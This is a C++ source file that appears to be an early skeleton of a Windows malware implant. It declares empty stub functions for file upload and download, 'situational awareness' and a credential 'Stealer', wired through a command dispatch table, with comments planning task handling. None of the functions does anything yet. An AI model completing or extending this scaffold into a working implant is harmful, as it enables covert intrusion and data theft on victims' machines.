#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unordered_map> // want to include standard c++ stl 
#include <iostream>
#include <windows.h>


/* start of implant functions*/

void FileUpload(char* Path){}

void FileDownload(){}

void SitAware(){}

void Stealer(){}

/*Task Dispatch*/
using pfunc = void (*)(std::string);
std::unordered_map<std::string, pfunc> dispatch_table;

void DispatchTableInit(){
    dispatch_table["SitAware"] = (pfunc)SitAware;
    dispatch_table["FileDown"] = (pfunc) FileDownload;
    dispatch_table["FileUp"] = (pfunc)FileUpload;
    dispatch_table["Stealer"] = (pfunc)Stealer;
    }


//these functions are listd above but maybe we should break it up
//tasks are lists of tasks structured [cmd: , args:, taskid: ]
void tasks_dispatch(char ** tasks);
//create results arr and return

void task_do(char *task);
//get cmd, args, id
//choose execute
// read output from file and return res



void tasking();

/* other helper functions necessary*/

void readFile(char * Path, char * buf);


int main(int argc, char* argv[]){

    DispatchTableInit();
    for (auto x : dispatch_table) {
	std::cout << x.first << " " <<
			x.second << "\n";
}



    return 0;
}